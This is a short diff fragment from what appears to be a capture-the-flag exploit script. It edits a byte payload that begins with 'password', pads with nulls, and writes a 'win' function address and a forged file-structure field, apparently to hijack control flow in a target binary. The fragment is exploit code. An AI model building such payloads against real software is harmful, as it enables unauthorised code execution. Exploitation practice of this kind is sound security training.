@@ -21,8 +21,8 @@ log.info(f"fp: {hex(fp_addr)}")
 
 win = 0x4018e6
 
-
-payload = b'\x00' * 0x80
+payload = b'password'
+payload += b'\x00' * 0x78
 payload += p64(win)
 payload += p64(fp_addr + 0xe0)  # Some other field
 payload += b'\x00' * 0x10  # _codecvt
